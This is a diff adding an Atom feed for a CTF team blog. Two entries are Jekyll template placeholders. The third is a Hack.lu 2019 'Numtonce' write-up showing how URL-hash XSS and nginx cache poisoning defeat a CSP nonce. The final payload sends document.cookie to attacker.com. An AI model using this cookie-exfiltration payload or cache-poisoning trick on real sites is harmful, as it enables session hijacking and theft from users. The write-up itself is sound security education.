@@ -1,0 +1,128 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2020-01-14T23:55:27+00:00</updated><id>/feed.xml</id><title type="html">LetzPwn - Luxembourgish CTF Team</title><subtitle></subtitle><entry><title type="html">First Writeup</title><link href="/writeup/easyctf/2019/10/15/http-splitting-writeup.html" rel="alternate" type="text/html" title="First Writeup" /><published>2019-10-15T23:10:05+00:00</published><updated>2019-10-15T23:10:05+00:00</updated><id>/writeup/easyctf/2019/10/15/http-splitting-writeup</id><content type="html" xml:base="/writeup/easyctf/2019/10/15/http-splitting-writeup.html">&lt;h1 id=&quot;this-is-a-writeup&quot;&gt;This is a writeup&lt;/h1&gt;
+
+&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;this-is-a-subtitle&quot;&gt;This is a subtitle&lt;/h2&gt;
+
+&lt;h3 id=&quot;this-is-a-sub-sub-title&quot;&gt;this is a sub-sub title&lt;/h3&gt;
+&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">This is a writeup</summary></entry><entry><title type="html">First Writeup</title><link href="/ctf/easyctf/2019/10/15/simplectf.html" rel="alternate" type="text/html" title="First Writeup" /><published>2019-10-15T23:10:05+00:00</published><updated>2019-10-15T23:10:05+00:00</updated><id>/ctf/easyctf/2019/10/15/simplectf</id><content type="html" xml:base="/ctf/easyctf/2019/10/15/simplectf.html">&lt;p&gt;This is a writeup&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Check out the &lt;a href=&quot;https://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;</content><author><name></name></author><summary type="html">This is a writeup</summary></entry><entry><title type="html">Numtonce</title><link href="/writeup/2019/10/11/Numtonce.html" rel="alternate" type="text/html" title="Numtonce" /><published>2019-10-11T23:10:05+00:00</published><updated>2019-10-11T23:10:05+00:00</updated><id>/writeup/2019/10/11/Numtonce</id><content type="html" xml:base="/writeup/2019/10/11/Numtonce.html">&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;With all the bad news in the world, everyone needs a calm place to wind down. 
+&lt;a href=&quot;https://numtonce.fluxfingersforfuture.fluxfingers.net/&quot;&gt;We built one&lt;/a&gt;, 
+but you have to help us keep it safe. If you find anything suspicious, 
+&lt;a href=&quot;https://numtonce.fluxfingersforfuture.fluxfingers.net/submit/&quot;&gt;tell the forest ranger&lt;/a&gt;!
+He might reward you with a cookie :)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://github.com/LetzPwn/ctf-writeups/raw/master/hack_lu_2019/Numtonce/website.png&quot; alt=&quot;Image of Website&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
+&lt;p&gt;XSS is possible over URL hash. However CSP is set, so no external scripts allowed. Except if nonce tag is correct. Idea is to 
+force the nonce tag to be the same after refreshes by loading the website from a cache. js/css/image files are loaded from cache, the index.php file itself not. 
+Force index.php file to load from cache by appending a css filename to the url: http://url.com/index.php/blub.css. index.php will still load, 
+however the proxy server things it is a css file and loads a cached version of index.php. Hence, we know the nonce in advance and can exceute custom js.&lt;/p&gt;
+
+&lt;h2 id=&quot;complete-writeup&quot;&gt;Complete Writeup&lt;/h2&gt;
+&lt;p&gt;By reading the description, it seems like the goal of the challenge is to steal a cookie from the browser. 
+This is usually done by injecting custom javascript into the website (XSS) with a piece of code sending 
+the cookie to a server controlled by the attacker. The forest ranger’s website is just a text field to subit an URL too. 
+A bot will then visit that URL with a cookie set to the flag to capture. Knowing this, the plan of attack:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Forge an URL that triggers custom javascript to send the cookie to a server we control&lt;/li&gt;
+  &lt;li&gt;Submit the URL to the forest ranger bot&lt;/li&gt;
+  &lt;li&gt;Check our server logs for stolen cookie&lt;/li&gt;
+  &lt;li&gt;Submit the flag inside the cookie :)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Looking at the website itself, it seems to be very simplistic. It has one single page and the source code is pretty much only this javascript code:&lt;/p&gt;
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;nonce=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;b80a92df721eda620876363536b7e9a6&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/emojify.min.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;location&lt;/span&gt;
+      &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hash&lt;/span&gt;
+      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hostname&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;search&lt;/span&gt;
+      &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;O&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;O&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;decodeURIComponent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;o0o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+      &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sessionStorage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt;
+      &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;my&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;there is p&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;my&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;`t'
+˂/script&amp;gt;
+
+&amp;lt;script&amp;gt;
+    o0o='nope'
+˂/script&amp;gt;
+
+A wise man once said: 'A CSP a day keeps the XSS away.`&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;lt;div id=&quot;garden&quot;&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o0o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;tt t t t fnttttttttt nfst t ttt n t tl t  tnr tmtt dt n  cttttrttntt t tttttnttt   t t nt   tt tt nt  t  t  t&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;:evergreen_tree:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;:fallen_leaf:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;:squirrel:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;:leaves:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;:rabbit:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;:maple_leaf:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;:droplet:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;:cherry_blossom:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;lt;br/&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt; &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;:white_small_square:&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;nx&quot;&gt;emojify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setConfig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;img_dir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;/emojis&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;emojify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;garden&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Looking at the code, it is pretty clear that XSS over the URL is possible due to the &lt;code class=&quot;highlighter-rouge&quot;&gt;document.write(o0o)&lt;/code&gt; line. Backtracing &lt;code class=&quot;highlighter-rouge&quot;&gt;o0o&lt;/code&gt;, 
+one can see that it is generated using the components of the url after the hashtag. Precisely, one can inject code using the following url scheme:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;https://numtonce.fluxfingersforfuture.fluxfingers.net/#numtonce.fluxfingersforfuture.fluxfingers.net&amp;lt;h1&amp;gt;test&amp;lt;/h1&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Next step is to try to embed our javascript code. However, that is where we hit a wall:
+&lt;img src=&quot;https://github.com/LetzPwn/ctf-writeups/raw/master/hack_lu_2019/Numtonce/csp.png&quot; alt=&quot;Image of CSP error&quot; /&gt;
+A CSP header was set to not allow scripts, except if the nonce tag or the scripts sha256 was correct:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Security-Policy: default-src 'none'; script-src 'sha256-CRtdY47bt+vWDdsuOTTeizFLvSy49h32pVgpWlyN0TU=' 'nonce-117bc8c1d6ead80e5b6ad3f3eca4921e'; img-src 'self'; style-src 'self'; base-uri 'none'; frame-ancestors 'none'; form-action 'none';&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The nonce is a random token that gets newly generated whenever the site reloads. 
+Both options seemed impossible to us (and even the &lt;a href=&quot;https://csp-evaluator.withgoogle.com/&quot;&gt;CSP Evaulator said the header is safe&lt;/a&gt;), 
+so we started to try to understand the rest of the javascript code and even analyze the included &lt;code class=&quot;highlighter-rouge&quot;&gt;emojify.js&lt;/code&gt;. 
+This proved to be completely unnecassary (see &lt;em&gt;Lessons learned&lt;/em&gt; ). 
+The rest of the javascript proved to be distractions only. It even includes a &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&lt;/code&gt; tag that is not an actual script tag, 
+but a comparison to a javascript variable called script. We spent a lot of time trying to figure out the meaning of all this but it was worthless.&lt;/p&gt;
+
+&lt;p&gt;After a while something intersting hit us. The js/css/image files included a strange header in the HTTP response:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Hit-Or-Miss: i guess they never miss huh?&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;This is when we noticed that js/css/iamge files were loaded from a cache. They also had an Age header, which expired after 10 minutes.
+Then the idea struck, that if we managed to load the index.php from cache, the token would be the same for 10 minutes! We tried to force loading the index.php by setting some speciel request headers (Cache-Control, etc.). 
+However none worked and also the bot to steal the cookie from would not have them set.&lt;/p&gt;
+
+&lt;p&gt;As one other header was &lt;code class=&quot;highlighter-rouge&quot;&gt;Server: nginx&lt;/code&gt;, we looked up how to setup a basic cache on nginx. Basically, a regex filter is applied to the url and if it matches, files get cached.&lt;/p&gt;
+
+&lt;p&gt;So we tried to forge an URL that ends with .css but still loads index.php. After some trial and error, we forged the following url: &lt;code class=&quot;highlighter-rouge&quot;&gt;https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;SUCCESS! The nonce token was always the same and the response had all the caching headers!&lt;/p&gt;
+
+&lt;p&gt;Trying out the following we get XSS with an alert ( {nonce} being the CSP nonce token that was in a previous response header):
+&lt;code class=&quot;highlighter-rouge&quot;&gt;https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net&amp;lt;script nonce=&quot;{nonce}&quot;&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;However trying to send the cookie to our server via ajax or as img src didn’t work due to the CSP again. So we used the same trick again and wrote a script tag with the correct nonce:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;document.write('&amp;lt;script nonce=&quot;{nonce}&quot; src=&quot;https://attacker.com/cookie='+document.cookie+'&quot;&amp;gt;&amp;lt;/script&amp;gt;');&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;In hindsight, a document.location=https://attacker.com/cookie=’+document.cookie+’ would have worked too.&lt;/p&gt;
+
+&lt;h2 id=&quot;final-solution&quot;&gt;Final Solution&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;https://numtonce.fluxfingersforfuture.fluxfingers.net/index.php/blub.css#numtonce.fluxfingersforfuture.fluxfingers.net&amp;lt;script nonce=&quot;{nonce}&quot;&amp;gt;document.write('&amp;lt;script nonce=&quot;{nonce}&quot; src=&quot;https://attacker.com/cookie='+document.cookie+'&quot;&amp;gt;&amp;lt;/script&amp;gt;');&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;{nonce} being the CSP nonce token that was in a previous response header with the same URL&lt;/p&gt;
+
+&lt;h2 id=&quot;lessons-learned&quot;&gt;Lessons learned&lt;/h2&gt;
+&lt;p&gt;Check and understand the CSP! We would have saved a looot of time if we understood the CSP correctly straight away. As &lt;code class=&quot;highlighter-rouge&quot;&gt;default-src&lt;/code&gt; was set to &lt;code class=&quot;highlighter-rouge&quot;&gt;none&lt;/code&gt;. 
+We should have noticed that it is impossible to include any external resource. Meaning that even if we would have found some unsafe javascript code inside the website itself, 
+it would still have been impossible to send the cookie to an external server! The only exceptions to be able to contact an external server would be if the nonce of a script tag is correct or the sha256 
+of the external script would be correct. As it is impossible to find sha256 collisions, finding a correct nonce is the only possible solution. So no matter what we tried to do,
+we sould have noticed from the beginning that we needed to force a valid nonce!&lt;/p&gt;</content><author><name>Alain K.</name></author><summary type="html">Description With all the bad news in the world, everyone needs a calm place to wind down. We built one, but you have to help us keep it safe. If you find anything suspicious, tell the forest ranger! He might reward you with a cookie :)</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/website.png" /></entry></feed>
